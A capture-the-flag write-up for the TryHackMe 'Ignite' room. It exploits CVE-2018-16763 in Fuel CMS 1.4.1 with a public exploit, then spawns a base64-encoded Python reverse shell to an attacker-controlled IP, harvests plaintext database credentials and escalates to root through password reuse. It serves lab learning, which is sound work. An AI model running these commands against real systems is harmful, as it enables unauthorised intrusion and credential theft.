# Ignite - TryHackMe Writeup

**Room:** Ignite  
**Difficulty:** Easy  
**OS:** Linux

---

## 1. Reconnaissance

Start with a service/version scan:

```bash
nmap -sC -sV -oN ignite.nmap <TARGET_IP>
```

Result:
- `80/tcp` open (`Apache`)
- Fuel CMS default page exposed on `http://<TARGET_IP>`
- Fuel CMS version visible: `1.4.1`
- Default credentials shown: `admin:admin`

---

## 2. Vulnerability Identification

Fuel CMS `1.4.1` is vulnerable to `CVE-2018-16763` (RCE via PHP code injection in the `filter` parameter on the `pages` endpoint).

Find and copy the public exploit:

```bash
searchsploit fuel cms
searchsploit -m 47138
```

---

## 3. Exploitation

Edit `47138.py` and set target URL:

```python
url = "http://<TARGET_IP>"
```

If the exploit script has Burp proxy hardcoded and Burp is not running, requests may hang. Disable it:

```python
# proxies = {'http': 'http://127.0.0.1:8080'}
```

Run exploit:

```bash
python3 47138.py
```

You get a limited web shell where each command executes independently.

---

## 4. Upgrade to Reverse Shell

Start listener:

```bash
nc -lvnp 4444
```

Build a base64-encoded Python reverse shell payload:

```bash
echo 'python3 -c '"'"'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"'"'' | base64 -w 0
```

Execute through web shell:

```bash
echo <BASE64_STRING> | base64 -d | sh
```

You now have shell access as `www-data`.

Stabilize TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 5. Post-Exploitation Enumeration

Basic host checks:

```bash
uname -a
cat /etc/passwd
```

Inspect Fuel CMS DB config:

```bash
cat /var/www/html/fuel/application/config/database.php
```

Credentials found in plaintext:

```text
'username' => 'root'
'password' => 'mememe'
```

Get user flag:

```bash
find / -name user.txt 2>/dev/null
cat /home/<user>/user.txt
```

---

## 6. Privilege Escalation

Try password reuse on root account:

```bash
su root
# Password: mememe
```

Read root flag:

```bash
cat /root/root.txt
```

---

## Key Takeaways

- Default credentials on exposed admin surfaces are immediate compromise vectors
- `CVE-2018-16763` is a direct unsanitized-input-to-RCE chain
- Base64 wrapping payloads helps avoid escaping/quoting issues in command injection contexts
- Password reuse across services (DB -> OS accounts) is a high-probability privilege escalation path
